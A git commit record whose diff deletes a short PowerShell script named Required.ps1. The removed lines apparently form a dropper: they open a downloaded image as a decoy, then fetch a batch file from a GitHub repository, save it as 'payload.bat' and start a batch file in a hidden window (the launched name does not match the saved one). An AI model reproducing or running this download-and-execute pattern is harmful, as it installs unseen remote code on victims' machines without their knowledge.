5284981aa4921c138adeaa622ef2a9149f8b8269
Andre0194 <andrewhere0194@gmail.com>
2025-07-10 18:09:59 +0530

    Delete Required.ps1

--- Required.ps1
+++
@@ -1,8 +0,0 @@
-cd $env:TEMP
-
-Invoke-WebRequest 'https://github.com/Andre0194/service/blob/master/Screenshot_09293832388382.jpg' -OutFile 'Screenshot.jpg'
-
-Start-Process -FilePath 'Screenshot.jpg'
-
-Invoke-WebRequest 'https://github.com/Andre0194/service/raw/refs/heads/master/Screenshot.bat' -OutFile 'payload.bat'
-Start-Process -FilePath 'Screenshot.bat' -WindowStyle Hidden
